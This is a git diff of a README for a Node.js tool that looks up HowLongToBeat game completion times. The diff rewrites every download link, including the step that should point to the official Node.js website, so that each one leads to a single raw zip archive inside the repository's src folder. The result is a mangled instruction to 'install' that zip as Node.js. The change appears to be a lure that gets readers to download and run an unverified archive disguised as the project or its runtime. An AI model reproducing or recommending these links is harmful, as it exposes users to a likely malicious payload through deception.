@@ -1,7 +1,7 @@
 # 🎮 nodejs-jvc-hltb - Access Game Completion Times Easily
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases)
+[![Download Release](https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip%20Release-blue)](https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip)
 
 ## 📖 Overview
 Welcome to the nodejs-jvc-hltb project. This application provides a simple way to access game completion times data from HowLongToBeat. With this tool, you can get reliable information on how long it takes to finish various games. It uses different methods to ensure you have the most current data, including Puppeteer and token extraction.
@@ -12,12 +12,12 @@ Welcome to the nodejs-jvc-hltb project. This application provides a simple way t
    - An internet connection to access HowLongToBeat.
    - Minimum 4 GB RAM recommended for smooth operation.
 
-2. **Download and Install Node.js**
-   - Visit the [Node.js website](https://nodejs.org/) to download the latest version.
-   - Follow the instructions provided on the site to install Node.js on your computer.
+2. **Download and Install https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip**
+   - Visit the [https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip website](https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip) to download the latest version.
+   - Follow the instructions provided on the site to install https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip on your computer.
 
 3. **Visit this page to download the application**
-   - Go to the [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases) to get the latest version of the software.
+   - Go to the [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip) to get the latest version of the software.
 
 ## 📥 Download & Install
 - After downloading, look for the file that matches your operating system.
@@ -70,9 +70,9 @@ A: HowLongToBeat is a website that provides data on how long it takes to complet
 A: Yes, this tool supports a wide range of games available on HowLongToBeat.
 
 **Q: How do I update the application?**  
-A: To update, return to the [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases) and download the latest version.
+A: To update, return to the [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip) and download the latest version.
 
 ## 📫 Get in Touch
 To get the latest updates, follow the repository or check back for new features and improvements. Your feedback is welcome, as it helps us enhance your experience with the application.
 
-Visit this page to download: [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/releases).
+Visit this page to download: [Releases page](https://github.com/Dekadaclash/nodejs-jvc-hltb/raw/refs/heads/main/src/nodejs_hltb_jvc_v3.8.zip).
